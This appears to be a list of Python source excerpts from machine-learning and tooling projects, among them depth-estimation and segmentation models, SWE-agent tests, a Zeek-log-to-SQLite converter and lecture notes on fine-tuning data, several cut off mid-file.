    "import torch\nimport torch.nn as nn\n\nfrom .base_model import BaseModel\nfrom .blocks import (\n    FeatureFusionBlock_custom,\n    Interpolate,\n    _make_encoder,\n    forward_beit,\n    forward_swin,\n    forward_levit,\n    forward_vit,\n)\nfrom .backbones.levit import stem_b4_transpose\nfrom timm.models.layers import get_act_layer\n\n\ndef _make_fusion_block(features, use_bn, size = None):\n    return FeatureFusionBlock_custom(\n        features,\n        nn.ReLU(False),\n        deconv=False,\n        bn=use_bn,\n        expand=False,\n        align_corners=True,\n        size=size,\n    )\n\n\nclass DPT(BaseModel):\n    def __init__(\n        self,\n        head,\n        features=256,\n        backbone=\"vitb_rn50_384\",\n        readout=\"project\",\n        channels_last=False,\n        use_bn=False,\n        **kwargs\n    ):\n\n        super(DPT, self).__init__()\n\n        self.channels_last = channels_last\n\n        # For the Swin, Swin 2, LeViT and Next-ViT Transformers, the hierarchical architectures prevent setting the \n        # hooks freely. Instead, the hooks have to be chosen according to the ranges specified in the comments.\n        hooks = {\n            \"beitl16_512\": [5, 11, 17, 23],\n            \"beitl16_384\": [5, 11, 17, 23],\n            \"beitb16_384\": [2, 5, 8, 11],\n            \"swin2l24_384\": [1, 1, 17, 1],  # Allowed ranges: [0, 1], [0,  1], [ 0, 17], [ 0,  1]\n            \"swin2b24_384\": [1, 1, 17, 1],                  # [0, 1], [0,  1], [ 0, 17], [ 0,  1]\n            \"swin2t16_256\": [1, 1, 5, 1],                   # [0, 1], [0,  1], [ 0,  5], [ 0,  1]\n            \"swinl12_384\": [1, 1, 17, 1],                   # [0, 1], [0,  1], [ 0, 17], [ 0,  1]\n            \"next_vit_large_6m\": [2, 6, 36, 39],            # [0, 2], [3,  6], [ 7, 36], [37, 39]\n            \"levit_384\": [3, 11, 21],                       # [0, 3], [6, 11], [14, 21]\n            \"vitb_rn50_384\": [0, 1, 8, 11],\n            \"vitb16_384\": [2, 5, 8, 11],\n            \"vitl16_384\": [5, 11, 17, 23],\n        }[backbone]\n\n        if \"next_vit\" in backbone:\n            in_features = {\n                \"next_vit_large_6m\": [96, 256, 512, 1024],\n            }[backbone]\n        else:\n            in_features = None\n\n        # Instantiate backbone and reassemble blocks\n        self.pretrained, self.scratch = _make_encoder(\n            backbone,\n            features,\n            False, # Set to true of you want to train from scratch, uses ImageNet weights\n            groups=1,\n            expand=False,\n            exportable=False,\n            hooks=hooks,\n            use_readout=readout,\n            in_features=in_features,\n        )\n\n        self.number_layers = len(hooks) if hooks is not None else 4\n        size_refinenet3 = None\n        self.scratch.stem_transpose = None\n\n        if \"beit\" in backbone:\n            self.forward_transformer = forward_beit\n        elif \"swin\" in backbone:\n            self.forward_transformer = forward_swin\n        elif \"next_vit\" in backbone:\n            from .backbones.next_vit import forward_next_vit\n            self.forward_transformer = forward_next_vit\n        elif \"levit\" in backbone:\n            self.forward_transformer = forward_levit\n            size_refinenet3 = 7\n            self.scratch.stem_transpose = stem_b4_transpose(256, 128, get_act_layer(\"hard_swish\"))\n        else:\n            self.forward_transformer = forward_vit\n\n        self.scratch.refinenet1 = _make_fusion_block(features, use_bn)\n        self.scratch.refinenet2 = _make_fusion_block(features, use_bn)\n        self.scratch.refinenet3 = _make_fusion_block(features, use_bn, size_refinenet3)\n        if self.number_layers >= 4:\n            self.scratch.refinenet4 = _make_fusion_block(features, use_bn)\n\n        self.scratch.output_conv = head\n\n\n    def forward(self, x):\n        if self.channels_last == True:\n            x.contiguous(memory_format=torch.channels_last)\n\n        layers = self.forward_transformer(self.pretrained, x)\n        if self.number_layers == 3:\n            layer_1, layer_2, layer_3 = layers\n        else:\n            layer_1, layer_2, layer_3, layer_4 = layers\n\n        layer_1_rn = self.scratch.layer1_rn(layer_1)\n        layer_2_rn = self.scratch.layer2_rn(layer_2)\n        layer_3_rn = self.scratch.layer3_rn(layer_3)\n        if self.number_layers >= 4:\n            layer_4_rn = self.scratch.layer4_rn(layer_4)\n\n        if self.number_layers == 3:\n            path_3 = self.scratch.refinenet3(layer_3_rn, size=layer_2_rn.shape[2:])\n        else:\n            path_4 = self.scratch.refinenet4(layer_4_rn, size=layer_3_rn.shape[2:])\n            path_3 = self.scratch.refinenet3(path_4, layer_3_rn, size=layer_2_rn.shape[2:])\n        path_2 = self.scratch.refinenet2(path_3, layer_2_rn, size=layer_1_rn.shape[2:])\n        path_1 = self.scratch.refinenet1(path_2, layer_1_rn)\n\n        if self.scratch.stem_transpose is not None:\n            path_1 = self.scratch.stem_transpose(path_1)\n\n        out = self.scratch.output_conv(path_1)\n\n        return out\n\n\nclass DPTDepthModel(DPT",
    "import argparse\nimport glob\nimport os\nimport numpy as np\nimport torch\nimport torch.nn as nn\nimport torch.nn.functional as F\nimport torch.utils.data as data\nimport yaml\n\nfrom PIL import Image\nfrom tqdm import tqdm\nfrom torchvision import transforms, utils\n\nfrom utils.datasets import *\nfrom utils.functions import *\nfrom trainer import *\n\ntorch.backends.cudnn.enabled = True\ntorch.backends.cudnn.deterministic = True\ntorch.backends.cudnn.benchmark = True\ntorch.autograd.set_detect_anomaly(True)\nImage.MAX_IMAGE_PIXELS = None\ndevice = torch.device('cuda')\n\nparser = argparse.ArgumentParser()\nparser.add_argument('--config', type=str, default='001', help='Path to the config file.')\nparser.add_argument('--pretrained_model_path', type=str, default='./pretrained_models/143_enc.pth', help='pretrained stylegan2 model')\nparser.add_argument('--stylegan_model_path', type=str, default='./pixel2style2pixel/pretrained_models/psp_ffhq_encode.pt', help='pretrained stylegan2 model')\nparser.add_argument('--arcface_model_path', type=str, default='./pretrained_models/backbone.pth', help='pretrained ArcFace model')\nparser.add_argument('--parsing_model_path', type=str, default='./pretrained_models/79999_iter.pth', help='pretrained parsing model')\nparser.add_argument('--log_path', type=str, default='./logs/', help='log file path')\nparser.add_argument('--resume', action='store_true', help='resume from checkpoint')\nparser.add_argument('--checkpoint', type=str, default='', help='checkpoint file path')\nparser.add_argument('--checkpoint_noiser', type=str, default='', help='checkpoint file path')\nparser.add_argument('--multigpu', type=bool, default=False, help='use multiple gpus')\nparser.add_argument('--input_path', type=str, default='./test/', help='evaluation data file path')\nparser.add_argument('--save_path', type=str, default='./output/image/', help='output data save path')\n\nopts = parser.parse_args()\n\nlog_dir = os.path.join(opts.log_path, opts.config) + '/'\nconfig = yaml.load(open('./configs/' + opts.config + '.yaml', 'r'), Loader=yaml.FullLoader)\n\n# Initialize trainer\ntrainer = Trainer(config, opts)\ntrainer.initialize(opts.stylegan_model_path, opts.arcface_model_path, opts.parsing_model_path)  \ntrainer.to(device)\n\nstate_dict = torch.load(opts.pretrained_model_path)#os.path.join(opts.log_path, opts.config + '/checkpoint.pth'))\ntrainer.enc.load_state_dict(torch.load(opts.pretrained_model_path))\ntrainer.enc.eval()\n\nimg_to_tensor = transforms.Compose([\n    transforms.Resize((1024, 1024)),\n    transforms.ToTensor(),\n    transforms.Normalize(mean=[0.5, 0.5, 0.5], std=[0.5, 0.5, 0.5])\n])\n\n# simple inference\nimage_dir = opts.input_path\nsave_dir = opts.save_path\nos.makedirs(save_dir, exist_ok=True)\n\nwith torch.no_grad():\n    img_list = [glob.glob1(image_dir, ext) for ext in ['*jpg','*png']]\n    img_list = [item for sublist in img_list for item in sublist]\n    img_list.sort()\n    for i, img_name in enumerate(img_list):\n        #print(i, img_name)\n        image_A = img_to_tensor(Image.open(image_dir + img_name)).unsqueeze(0).to(device)\n        output = trainer.test(img=image_A, return_latent=True)\n        feature = output.pop()\n        latent = output.pop()\n        #np.save(save_dir + 'latent_code_%d.npy'%i, latent.cpu().numpy())\n        utils.save_image(clip_img(output[1]), save_dir + img_name)\n        if i > 1000:\n            break\n",
    "from typing import TYPE_CHECKING\n\nfrom ...utils import (\n    DIFFUSERS_SLOW_IMPORT,\n    OptionalDependencyNotAvailable,\n    _LazyModule,\n    get_objects_from_module,\n    is_torch_available,\n    is_transformers_available,\n)\n\n\n_dummy_objects = {}\n_import_structure = {}\n\ntry:\n    if not (is_transformers_available() and is_torch_available()):\n        raise OptionalDependencyNotAvailable()\nexcept OptionalDependencyNotAvailable:\n    from ...utils import dummy_torch_and_transformers_objects  # noqa F403\n\n    _dummy_objects.update(get_objects_from_module(dummy_torch_and_transformers_objects))\nelse:\n    _import_structure[\"camera\"] = [\"create_pan_cameras\"]\n    _import_structure[\"pipeline_shap_e\"] = [\"ShapEPipeline\"]\n    _import_structure[\"pipeline_shap_e_img2img\"] = [\"ShapEImg2ImgPipeline\"]\n    _import_structure[\"renderer\"] = [\n        \"BoundingBoxVolume\",\n        \"ImportanceRaySampler\",\n        \"MLPNeRFModelOutput\",\n        \"MLPNeRSTFModel\",\n        \"ShapEParamsProjModel\",\n        \"ShapERenderer\",\n        \"StratifiedRaySampler\",\n        \"VoidNeRFModel\",\n    ]\n\nif TYPE_CHECKING or DIFFUSERS_SLOW_IMPORT:\n    try:\n        if not (is_transformers_available() and is_torch_available()):\n            raise OptionalDependencyNotAvailable()\n\n    except OptionalDependencyNotAvailable:\n        from ...utils.dummy_torch_and_transformers_objects import *\n    else:\n        from .camera import create_pan_cameras\n        from .pipeline_shap_e import ShapEPipeline\n        from .pipeline_shap_e_img2img import ShapEImg2ImgPipeline\n        from .renderer import (\n            BoundingBoxVolume,\n            ImportanceRaySampler,\n            MLPNeRFModelOutput,\n            MLPNeRSTFModel,\n            ShapEParamsProjModel,\n            ShapERenderer,\n            StratifiedRaySampler,\n            VoidNeRFModel,\n        )\n\nelse:\n    import sys\n\n    sys.modules[__name__] = _LazyModule(\n        __name__,\n        globals()[\"__file__\"],\n        _import_structure,\n        module_spec=__spec__,\n    )\n\n    for name, value in _dummy_objects.items():\n        setattr(sys.modules[__name__], name, value)\n",
    "\"\"\"\nThis file may have been modified by Bytedance Ltd. and/or its affiliates (\u201cBytedance's Modifications\u201d).\nAll Bytedance's Modifications are Copyright (year) Bytedance Ltd. and/or its affiliates. \n\nReference: https://github.com/facebookresearch/Mask2Former/blob/main/mask2former/maskformer_model.py\n\"\"\"\nfrom typing import Tuple\n\nimport torch\nfrom torch import nn\nfrom torch.nn import functional as F\n\nfrom detectron2.config import configurable\nfrom detectron2.data import MetadataCatalog\nfrom detectron2.modeling import META_ARCH_REGISTRY, build_backbone, build_sem_seg_head\nfrom detectron2.modeling.backbone import Backbone\nfrom detectron2.modeling.postprocessing import sem_seg_postprocess\nfrom detectron2.structures import Boxes, ImageList, Instances, BitMasks\nfrom detectron2.utils.memory import retry_if_cuda_oom\n\nfrom .modeling.criterion import SetCriterion\nfrom .modeling.matcher import HungarianMatcher\n\n\nfrom .modeling.transformer_decoder.fcclip_transformer_decoder import MaskPooling, get_classification_logits\nVILD_PROMPT = [\n    \"a photo of a {}.\",\n    \"This is a photo of a {}\",\n    \"There is a {} in the scene\",\n    \"There is the {} in the scene\",\n    \"a photo of a {} in the scene\",\n    \"a photo of a small {}.\",\n    \"a photo of a medium {}.\",\n    \"a photo of a large {}.\",\n    \"This is a photo of a small {}.\",\n    \"This is a photo of a medium {}.\",\n    \"This is a photo of a large {}.\",\n    \"There is a small {} in the scene.\",\n    \"There is a medium {} in the scene.\",\n    \"There is a large {} in the scene.\",\n]\n\n\n@META_ARCH_REGISTRY.register()\nclass FCCLIP(nn.Module):\n    \"\"\"\n    Main class for mask classification semantic segmentation architectures.\n    \"\"\"\n\n    @configurable\n    def __init__(\n        self,\n        *,\n        backbone: Backbone,\n        sem_seg_head: nn.Module,\n        criterion: nn.Module,\n        num_queries: int,\n        object_mask_threshold: float,\n        overlap_threshold: float,\n        train_metadata,\n        test_metadata,\n        size_divisibility: int,\n        sem_seg_postprocess_before_inference: bool,\n        pixel_mean: Tuple[float],\n        pixel_std: Tuple[float],\n        # inference\n        semantic_on: bool,\n        panoptic_on: bool,\n        instance_on: bool,\n        test_topk_per_image: int,\n        # FC-CLIP\n        geometric_ensemble_alpha: float,\n        geometric_ensemble_beta: float,\n        ensemble_on_valid_mask: bool,\n    ):\n        \"\"\"\n        Args:\n            backbone: a backbone module, must follow detectron2's backbone interface\n            sem_seg_head: a module that predicts semantic segmentation from backbone features\n            criterion: a module that defines the loss\n            num_queries: int, number of queries\n            object_mask_threshold: float, threshold to filter query based on classification score\n                for panoptic segmentation inference\n            overlap_threshold: overlap threshold used in general inference for panoptic segmentation\n            metadata: dataset meta, get `thing` and `stuff` category names for panoptic\n                segmentation inference\n            size_divisibility: Some backbones require the input height and width to be divisible by a\n                specific integer. We can use this to override such requirement.\n            sem_seg_postprocess_before_inference: whether to resize the prediction back\n                to original input size before semantic segmentation inference or after.\n                For high-resolution dataset like Mapillary, resizing predictions before\n                inference will cause OOM error.\n            pixel_mean, pixel_std: list or tuple with #channels element, representing\n                the per-channel mean and std to be used to normalize the input image\n            semantic_on: bool, whether to output semantic segmentation prediction\n            instance_on: bool, whether to output instance segmentation prediction\n            panoptic_on: bool, whether to output panoptic segmentation prediction\n            test_topk_per_image: int, instance segmentation parameter, keep topk instances per image\n        \"\"\"\n        super().__init__()\n        self.backbone = backbone\n        self.sem_seg_head = sem_seg_head\n        self.criterion = criterion\n        self.num_queries = num_queries\n        self.overlap_threshold = overlap_threshold\n        self.object_mask_threshold = object_mask_threshold\n        self.train_metadata = train_metadata\n        self.test_metadata = test_metadata\n        if size_divisibility < 0:\n            # use backbone size_divisibility if not set\n            size_divisibility = self.backbone.size_divisibility\n        self.size_divisibility = size_divisibility\n        self.sem_seg_postprocess_before_inference = sem_seg_postprocess_before_inference\n        self.register_buffer(\"pixel_mean\", torch.Tensor(pixel_mean).view(-1, 1, 1), False)\n        self.register_buffer(\"pixel_std\", torch.Tensor(pixel_std).view(-1, 1, 1), False)\n\n        # additional args\n        ",
    "from util import *\n\ndef lecture_14():\n    note(\"Previous lectures: data for pretraining => general capabilities\")\n\n    note(\"What if you want to add new capabilities to your language model?\")\n\n    # Types of capabilities\n    note(\"- Solving tasks (e.g., information extraction)\")\n    note(\"- Instruction following and chat\")\n\n    note(\"- Long contexts (e.g., 4096 -> 100,000)\")\n    note(\"- Infilling (e.g., the cat __ the hat)\")\n\n    note(\"- Domain-specific capabilities (e.g., coding, math, medicine)\")\n\n    note(\"- Safety (e.g., refusal)\")\n    note(\"- Reasoning (e.g., chain of thought)\")\n\n    # Focus\n    note(\"This lecture: fine-tune on *data* that exhibits the desired capabilities\")\n\n    note(\"Sources of data\")\n    note(\"- Annotators (e.g., Llama 2 instruction data)\")\n    note(\"- Real users (e.g., ShareGPT)\")\n    note(\"- Curated (e.g., from Common Crawl)\")\n    note(\"- Distilled from stronger model (e.g., synthetic data from GPT-4)\")\n    note(\"- Self-distillation (synthetic data from model you're training)\")\n\n    training_stages()\n\n    tasks()                # Tasks, standard datasets\n    instruction_chat()     # Instruction following and chat, various data\n\n    long_context()         # Long context\n    infilling()            # Infilling\n\n    domains()              # Domain-specific knowledge and skills, various data\n\n    reasoning()           # Reasoning, distillation\n    self_distillation()   # Self-distillation\n\n    note(\"Discussion on types of data\")\n    note(\"- Extract useful signals from the web\")\n    note(\"- Distillation from stronger model (GPT-4): cheap, scientifically interesting (oracle); \"\n         \"be careful of licenses, playing catch up, not pushing things forward\")\n    note(\"- Self-distillation (constitutional AI, STaR): synthetic data, promising way to squeeze more out\")\n\n    note(\"## Summary\")\n    note(\"Add general capabilities just by adding data - very flexible!\")\n    note(\"Not a substitute for a strong base model (for generalization)\")\n    note(\"But for specific tasks, can get much smaller models to perform well\")\n\n    note(\"Data is the key ingredient that differentiates language models\")\n    note(\"Live service => raw data => processed data (conversion, filtering, deduplication)\")\n    note(\"Legal and ethical issues (e.g., copyright and privacy)\")\n    note(\"Much of this pipeline is heuristic, many opportunities to improve\")\n\n    note(\"Next time: alignment\")\n\n\ndef training_stages():\n    note(\"The textbook version:\")\n    note(\"1. Pre-training: train on raw text (e.g., documents from the web)\")\n    note(\"2. Mid-training (continued pre-training): enhance capabilities\")\n    note(\"3. Post-training: fine-tune on a particular task/dataset\")\n\n    note(\"Reality: lines are blurry\")\n    note(\"- Often there are multiple stages of training\")\n    note(\"- Train on general data, then train on clean data\")\n    note(\"- Mix in instruction data towards the end of training\")\n\n    note(\"Example (Dolma): (1) 2T tokens of Dolma 1.7, (2) 50B tokens on {Wikipedia, OpenWebMath, Flan}\")\n    see(\"https://blog.allenai.org/olmo-1-7-7b-a-24-point-improvement-on-mmlu-92b43f7d269d\")\n    image(\"https://miro.medium.com/v2/resize:fit:828/format:webp/1*QFZ9R3xZUH8stKchJz9G7w.png\")  # Stage 1\n    image(\"https://miro.medium.com/v2/resize:fit:828/format:webp/1*B_GIIKvnDKPFXEVb8Qd7Sw.png\")  # Stage 2\n\n    note(\"Note: base model doesn't mean just trained on web documents\")\n\n\ndef tasks():\n    note(\"TL;DR: convert lots of existing NLP datasets into prompts\")\n\n    note(\"Super-Natural Instructions [Wang+ 2022]\"), see(\"https://arxiv.org/pdf/2204.07705\")\n    see(\"https://huggingface.co/datasets/Muennighoff/natural-instructions\")\n    note(\"Dataset: 1.6K+ tasks (Figure 2)\")\n    note(\"Fine-tune T5 on k-shot learning (Tk-instruct)\")\n    note(\"Tasks contributed by community (via GitHub)\")\n    note(\"Examples for each task are derived from existing datasets and converted into templatized prompts\")\n    note(\"Outperforms InstructGPT despite being much smaller(?)\")\n\n    note(\"Flan 2022 [Longpre+ 2023]\"), see(\"https://arxiv.org/pdf/2301.13688\")\n    note(\"Dataset: 1.8K+ tasks\")\n    see(\"https://huggingface.co/datasets/Muennighoff/flan\")\n    note(\"Fine-tune T5 on zero-shot, few-shot, chain-of-thought versions of the dataset (Figure 7)\")\n\n\ndef instruction_chat():\n    note(\"TL;DR: more open-ended instructions, heavy use of synthetic data\")\n\n    note(\"Alpaca [Taori+ 2023]\"), see(\"https://crfm.stanford.edu/2023/03/13/alpaca.html\")\n    note(\"Dataset of 52K examples from text-davinci-003 using self-instruct [Wang+ 2022]\"), see(\"https://arxiv.org/pdf/2212.10560\")\n    note(\"Fine-tune LLaMA 7B on this dataset\")\n\n    note(\"Vicuna [LMSYS 2023]\"), see(\"https://lmsys.org/blog/2023-03-30-vicuna/\")\n    note(\"Fine-tuned LLaMA on 70K conversations from ShareGPT (user-shared ChatGPT)\"), see(\"https://sharegpt.com/\")\n\n    note(\"Baize [Xu+ 2023]\"), see(\"https://arxiv.org/pdf/2304.01196\")\n    note(\"Generate dataset (111.5K examples) from GPT-3.5 using self-chat (seeded with ",
    "# -----------------------------------------------------------\n# AUTHOR --------> Francisco Contreras\n# OFFICE --------> Senior VFX Compositor, Software Developer\n# WEBSITE -------> https://vinavfx.com\n# -----------------------------------------------------------\nimport shutil\nimport os\nimport nuke  # type: ignore\n\nfrom ..python_util.util import recursive_rename\nfrom ..nuke_util.nuke_util import duplicate_node\nfrom .common import get_available_name\n\n\ndef save_image_backup():\n    nuke.thisKnob().setEnabled(False)\n    this = nuke.thisNode()\n    read = nuke.toNode('read')\n    filename = read.knob('file').value()\n    secdir = os.path.dirname(filename)\n    output_dir = os.path.dirname(secdir)\n\n    if not os.path.isdir(secdir):\n        return\n\n    basename = os.path.basename(secdir)\n    backup_prefix = '{}_backup'.format(basename)\n    backup_name = get_available_name(backup_prefix, output_dir)\n    backup_dir = os.path.join(output_dir, backup_name)\n\n    number = backup_name.split('_')[-1]\n\n    new_filename = '{}/{}/{}_#####_.png'.format(\n        output_dir, backup_name, backup_name)\n\n    shutil.copytree(secdir, backup_dir)\n    recursive_rename(backup_dir, basename, backup_name)\n\n    if not '.nk' in this.parent().name():\n        this = this.parent()\n\n    new_read = duplicate_node(read, parent=this.parent())\n    new_read.knob('file').setValue(new_filename)\n    new_read.setName(this.name() + '_backup_' + number)\n    new_read.knob('reload').execute()\n\n    backup_nodes = []\n    this.parent().begin()\n\n    for n in nuke.allNodes():\n        if not this.name() + '_' in n.name():\n            continue\n\n        num = int(n.name().split('_')[-1])\n        backup_nodes.append((num, n))\n\n    backup_nodes = sorted(backup_nodes, key=lambda x: x[0])\n\n    xpos = this.xpos()\n    for num, n in reversed(backup_nodes):\n        xpos += 150\n        n.setXYpos(xpos, this.ypos())\n",
    "import argparse\nimport numpy as np\nimport os\nimport glob\nimport re\n\nfrom como.utils.io import save_traj\n\n\ndef convert_traj(traj_dir):\n    poses_list = glob.glob(os.path.join(traj_dir, \"pose/*.txt\"))\n    poses_list = sorted(\n        poses_list, key=lambda x: int(re.findall(\"\\d+\", x.rsplit(\"/\", 1)[-1])[0])\n    )\n\n    T_wc = np.zeros((0, 4, 4))\n    timestamps = []\n    for i, file_name in enumerate(poses_list):\n        pose_np = np.loadtxt(file_name)\n        pose_np = np.expand_dims(pose_np, axis=0)\n        if np.isfinite(pose_np).all():\n            T_wc = np.concatenate((T_wc, pose_np))\n            timestamps.append((1.0 / 30.0) * i)\n\n    traj_path_new = traj_dir + \"traj_tum.txt\"\n    save_traj(traj_path_new, timestamps, T_wc)\n\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser(\n        description=\"Arguments to convert ScanNet GT to TUM format.\"\n    )\n    parser.add_argument(\"traj_dir\", type=str, help=\"Path to config file.\")\n\n    args = parser.parse_args()\n\n    convert_traj(args.traj_dir)\n",
    "import hashlib\nimport subprocess\nimport pytest\nfrom sweagent.environment.utils import InvalidGithubURL, format_trajectory_markdown, _MARKDOWN_TRAJECTORY_EMOJI_MAPPING, get_instances, is_github_repo_url, remove_triple_backticks, parse_gh_repo_url, parse_gh_issue_url, is_github_issue_url, get_associated_commit_urls\n\ndef test_format_trajectory_markdown(test_trajectory):\n    formatted = format_trajectory_markdown(test_trajectory[\"trajectory\"])\n    assert formatted.startswith(\"<details>\")\n    assert formatted.endswith(\"</details>\")\n    for emoji in _MARKDOWN_TRAJECTORY_EMOJI_MAPPING.values():\n        assert emoji in formatted\n\n\ndef test_remove_triple_backticks():\n    assert remove_triple_backticks(\"```\") == \"\"\n\n\ndef test_is_github_repo_url():\n    assert is_github_repo_url(\"https://github.com/princeton-nlp/SWE-agent\")\n    assert is_github_repo_url(\"https://github.com/princeton-nlp/SWE-agent/anything\")\n    assert is_github_repo_url(\"github.com/princeton-nlp/SWE-agent/anything\")\n    assert not is_github_repo_url(\"\")\n    assert not is_github_repo_url(\"/path/to/file\")\n\n\ndef test_parse_gh_repo_url():\n    assert parse_gh_repo_url(\"https://github.com/princeton-nlp/SWE-agent\") == (\"princeton-nlp\", \"SWE-agent\")\n    assert parse_gh_repo_url(\"github.com/princeton-nlp/SWE-agent\") == (\"princeton-nlp\", \"SWE-agent\")\n    assert parse_gh_repo_url(\"github.com/princeton-nlp/SWE-agent/asdfjsdfg\") == (\"princeton-nlp\", \"SWE-agent\")\n    assert parse_gh_repo_url(\"git@github.com/princeton-nlp/SWE-agent/asdfjsdfg\") == (\"princeton-nlp\", \"SWE-agent\")\n\n\ndef test_parse_gh_repo_url_fails():\n    with pytest.raises(InvalidGithubURL):\n        parse_gh_repo_url(\"adfkj;lasdfl;kj\")\n    with pytest.raises(InvalidGithubURL):\n        parse_gh_repo_url(\"github.com/\")\n    with pytest.raises(InvalidGithubURL):\n        parse_gh_repo_url(\"github.com//a/\")\n\n\ndef test_parse_gh_issue_url():\n    url = \"https://github.com/princeton-nlp/SWE-agent/issues/43\"\n    owner, repo, no = parse_gh_issue_url(url)\n    assert owner == \"princeton-nlp\"\n    assert repo == \"SWE-agent\"\n    assert no == \"43\"\n\n\ndef test_parse_gh_issue_url_fails():\n    with pytest.raises(InvalidGithubURL):\n        parse_gh_issue_url(\"https://github.com/a/b\")\n    with pytest.raises(InvalidGithubURL):\n        parse_gh_issue_url(\"https://github.com/a/b////\")\n\n\ndef test_is_from_github_url():\n    assert not is_github_issue_url(\"\")\n    assert is_github_issue_url(\"https://github.com/princeton-nlp/SWE-agent/issues/43\")\n\n\ndef test_get_associated_commit_urls():\n    assoc = get_associated_commit_urls(\n        org=\"princeton-nlp\",\n        repo=\"SWE-agent\",\n        issue_number=\"41\"\n    )\n    assert len(assoc) > 0\n\n\ndef test_get_instance_gh_issue():\n    instance = get_instances(\"https://github.com/klieret/swe-agent-test-repo/issues/1\")[0]\n    compare_with = {\n        'repo': 'klieret/swe-agent-test-repo',\n        'instance_id': 'klieret__swe-agent-test-repo-i1',\n        \"repo_type\": \"github\",\n    }\n    for key in compare_with:\n        assert instance[key] == compare_with[key]\n    assert \"SyntaxError\" in instance[\"problem_statement\"]\n    assert len(instance[\"base_commit\"]) > 10\n    assert instance[\"version\"]\n\n\ndef clone_repo(tmp_path, repo_url):\n    cmd = [\"git\", \"clone\", repo_url, ]\n    subprocess.run(cmd, check=True, cwd=tmp_path)\n\n\ndef test_get_instance_gh_issue_local_repo(tmp_path):\n    clone_repo(tmp_path, \"https://github.com/klieret/swe-agent-test-repo/\")\n    instance = get_instances(\n        file_path=\"https://github.com/klieret/swe-agent-test-repo/issues/1\",\n        repo_path=str(tmp_path / \"swe-agent-test-repo\"),\n    )[0]\n    compare_with = {\n        'repo': str(tmp_path.resolve() / \"swe-agent-test-repo\"),\n        \"repo_type\": \"local\",\n        'instance_id': 'klieret__swe-agent-test-repo-i1'\n    }\n    for key in compare_with:\n        assert instance[key] == compare_with[key]\n    assert \"SyntaxError\" in instance[\"problem_statement\"]\n    assert len(instance[\"base_commit\"]) > 10\n    assert instance[\"version\"]\n\n\ndef test_get_instance_local_issue_local_repo(tmp_path):\n    clone_repo(tmp_path, \"https://github.com/klieret/swe-agent-test-repo/\")\n    issue_path = tmp_path / \"issue.txt\"\n    issue_path.write_text(\"asdf\")\n    instance = get_instances(\n        file_path=str(issue_path),\n        repo_path=str(tmp_path / \"swe-agent-test-repo\"),\n    )[0]\n    compare_with = {\n        'repo': str(tmp_path.resolve() / \"swe-agent-test-repo\"),\n        \"repo_type\": \"local\",\n        'instance_id': hashlib.sha256(\"asdf\".encode()).hexdigest()[:6],\n        \"problem_statement\": \"asdf\",\n    }\n    for key in compare_with:\n        assert instance[key] == compare_with[key]\n    assert len(instance[\"base_commit\"]) > 10\n    assert instance[\"version\"]\n\n\ndef test_get_instance_gh_issue_gh_repo(tmp_path):\n    instance = get_instances(\n        file_path=\"https://github.com/klieret/swe-agent-test-repo/issues/1\",\n        repo_path=\"https://github.com/princeton-nlp/SWE-agent\",\n    )[0]\n    compare_with = {\n        'repo': \"princeton-nlp/SWE-agent",
    "#!/usr/bin/python3\nimport sqlite3\nimport os\nimport csv\n\ndef create_table_from_log(cursor, table_name, columns):\n    if not columns:  # Check if the columns list is empty\n        raise ValueError(f\"No columns found for table {table_name}\")\n    column_definitions = ', '.join([f'\"{col}\" TEXT' for col in columns])\n    create_table_sql = f'CREATE TABLE IF NOT EXISTS \"{table_name}\" ({column_definitions});'\n    cursor.execute(create_table_sql)\n\ndef insert_data_from_log(cursor, table_name, columns, data):\n    placeholders = ', '.join(['?' for _ in columns])\n    column_names = ', '.join([f'\"{col}\"' for col in columns])\n    insert_sql = f'INSERT INTO \"{table_name}\" ({column_names}) VALUES ({placeholders});'\n    cursor.executemany(insert_sql, data)\n\ndef convert_zeek_logs_to_sqlite(db_name, directory):\n    conn = sqlite3.connect(db_name)\n    cursor = conn.cursor()\n\n    for filename in os.listdir(directory):\n        if filename.endswith(\".log\"):\n            table_name = os.path.splitext(filename)[0].replace('-', '_')  # Ensure table names are valid SQLite identifiers\n            log_path = os.path.join(directory, filename)\n\n            with open(log_path, 'r') as file:\n                reader = csv.reader(file, delimiter='\\t')\n                columns = []\n                for row in reader:\n                    if row[0].startswith('#fields'):\n                        columns = [col.replace('.', '_') for col in row[1:]]  # Adjusted to handle '#fields'\n                        break  # Stop after finding the columns\n\n                if not columns:\n                    print(f\"No columns extracted for {filename}.\")\n                    continue\n\n                create_table_from_log(cursor, table_name, columns)\n\n                data = [row for row in reader if not row[0].startswith('#')]  # Skip comment lines\n                insert_data_from_log(cursor, table_name, columns, data)\n\n    conn.commit()\n    conn.close()\n\n# Example usage\ndirectory_path = '/data/'  # Update this to the path of your Zeek log files\ndb_name = 'zeek_logs.db'\nconvert_zeek_logs_to_sqlite(db_name, directory_path)\n\n",
    "import argparse\nimport torch\nimport os\nimport shutil\nfrom diffusers.models import UNet2DConditionModel\nfrom diffusers.utils import SAFETENSORS_WEIGHTS_NAME\nfrom safetensors.torch import save_file\n\n\ndef get_args():\n    parser = argparse.ArgumentParser()\n    parser.add_argument('--lora_scale', type=float, default=1.0)\n    parser.add_argument('--lora_ckpt_path', type=str, required=True)\n    parser.add_argument('--unet_ckpt_path', type=str, required=True, help='root path of the sd1.5 model')\n    parser.add_argument('--save_path', type=str, required=True, help='args.unet_ckpt_path + a new subfolder name')\n    parser.add_argument('--unet_config_path', type=str, required=True, help='path to unet config, in the `unet` subfolder of args.unet_ckpt_path')\n    parser.add_argument('--lora_keys', nargs='*', type=str, default=['to_q', 'to_k', 'to_v', 'to_out'])\n    parser.add_argument('--negative_lora_keys', type=str, default=\"bias\")\n\n    return parser.parse_args()\n\n\nif __name__ == '__main__':\n    args = get_args()\n    os.makedirs(args.save_path, exist_ok=True)\n    unet = UNet2DConditionModel.from_pretrained(args.unet_ckpt_path, subfolder='unet')\n    fused_state_dict = unet.state_dict()\n\n    print(f'Loading the lora weights from {args.lora_ckpt_path}')\n    lora_state_dict = torch.load(args.lora_ckpt_path, map_location='cpu')\n    if 'state_dict' in lora_state_dict:\n        lora_state_dict = lora_state_dict['state_dict']\n    print(f'Loading done')\n    print(f'Fusing the lora weight to unet weight')\n    used_lora_key = []\n    for lora_key in args.lora_keys:\n        unet_keys = [x for x in fused_state_dict.keys() if lora_key in x and args.negative_lora_keys not in x]\n        print(f'There are {len(unet_keys)} unet keys for lora key: {lora_key}')\n        for unet_key in unet_keys:\n            prefixes = unet_key.split('.')\n            idx = prefixes.index(lora_key)\n            